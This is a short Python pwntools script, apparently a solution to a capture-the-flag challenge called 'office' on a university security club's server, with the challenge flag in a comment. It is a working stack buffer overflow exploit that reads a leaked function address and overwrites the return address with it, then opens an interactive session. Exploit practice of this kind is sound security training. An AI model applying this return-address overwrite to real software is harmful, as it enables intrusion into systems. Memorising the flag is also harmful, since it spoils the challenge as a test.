#!/usr/bin/python3

# SKYLIGHT{th1s_i5_n0t_0UR_0FF1ce}

from pwn import *
PROG_NAME = "./office"
REMOTE_IP = "pwn.ctf.unswsecurity.com"
REMOTE_PORT = 5002

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.recvline()
win_addr = int(p.recvline().rstrip().split()[-1], 16)

payload = b'A' * (0x3a + 4) + p32(win_addr)

p.sendline(payload)

p.interactive()